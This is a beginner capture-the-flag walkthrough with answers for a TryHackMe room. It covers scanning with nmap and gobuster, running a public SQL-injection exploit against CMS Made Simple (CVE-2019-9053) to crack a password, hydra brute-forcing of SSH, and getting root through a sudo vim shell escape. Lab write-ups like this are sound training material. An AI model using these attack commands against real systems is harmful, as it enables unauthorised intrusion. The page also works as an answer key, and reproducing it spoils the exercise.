# Tryhackme room address

***https://tryhackme.com/room/easyctf***

Beginner level ctf


## [Task 1] Simple CTF 


### 1 :	How many services are running under port 1000?

**2**

**nmap -sC -sV 10.10.10.47**


### 2 : What is running on the higher port? 

**ssh**


### 3 : What's the CVE you're using against the application? 

lets do a gobuster on our machine ip

we get a directory **simple** nothins else is interesting

so we can run gobuster again on **<ip address>/simple/**

now we get a login panel 

we can search for **cms made simple** on searchsploit

now we get the cve 

**CVE-2019-9053**


### 4 : To what kind of vulnerability is the application vulnerable?

**sqli**


### 5 : What's the password?

we can run the exploit

**python 46635.py -u http://10.10.10.47/simple --crack -w /usr/share/wordlists/rockyou.txt**

we get the password for mitch

**secret**

also i got the same password by bruteforcing ssh 

now we can check port 22 ftp

ftp <ip address>

we get a text file in pub directory

```
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

mow we know that mitch's password is weak so we can we can try to bruteforce ssh on 2222

**hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.47:2222**

now we get the same  password we can login as mitch


### 6 : What's the user flag?

**/bin/bash**

we have the user.txt now


### 7 : Is there any other user in the home directory? What's its name?

**sunbath**

### 8 : What can you leverage to spawn a privileged shell?

**sudo -l**

**vim**

### 9 : What's the root flag?

**sudo vim**

**:!/bin/bash**


now we are root  
